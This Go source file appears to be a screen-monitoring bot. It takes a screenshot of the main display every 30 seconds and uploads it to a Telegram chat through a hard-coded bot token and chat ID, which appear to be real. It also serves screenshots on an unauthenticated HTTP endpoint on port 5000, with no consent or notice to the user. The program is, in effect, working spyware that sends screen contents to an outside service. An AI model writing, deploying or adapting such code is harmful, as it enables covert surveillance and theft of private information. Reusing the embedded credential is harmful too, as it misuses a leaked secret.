package main

import (
	"bytes"
	"fmt"
	"image/png"
	"log"
	"net/http"
	"os"
	"os/user"
	"time"

	"github.com/kbinani/screenshot"
)

var botToken = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE"
var chatID   = "7208529004"

// take screenshot
func captureScreen() ([]byte, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return nil, fmt.Errorf("no active display")
	}
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, err
	}
	buf := new(bytes.Buffer)
	err = png.Encode(buf, img)
	if err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// send to telegram
func sendToTelegram(img []byte) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendPhoto", botToken)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(img))
	if err != nil {
		return err
	}
	q := req.URL.Query()
	q.Add("chat_id", chatID)
	req.URL.RawQuery = q.Encode()
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("telegram error: %s", resp.Status)
	}
	return nil
}

func main() {
	// log file in user profile
	usr, _ := user.Current()
	logFile := usr.HomeDir + "/monitor_bot.log"
	f, _ := os.OpenFile(logFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	defer f.Close()
	log.SetOutput(f)

	log.Println("INFO - Bot starting")

	// HTTP server for test
	http.HandleFunc("/s", func(w http.ResponseWriter, r *http.Request) {
		img, err := captureScreen()
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		w.Header().Set("Content-Type", "image/png")
		w.Write(img)
	})
	go func() {
		addr := ":5000"
		log.Println("INFO - HTTP server started on " + addr)
		http.ListenAndServe(addr, nil)
	}()

	// loop: send screenshot every 30 sec
	for {
		img, err := captureScreen()
		if err != nil {
			log.Println("ERROR - capture:", err)
		} else {
			err = sendToTelegram(img)
			if err != nil {
				log.Println("ERROR - telegram:", err)
			} else {
				log.Println("INFO - sent screenshot")
			}
		}
		time.Sleep(30 * time.Second)
	}
}
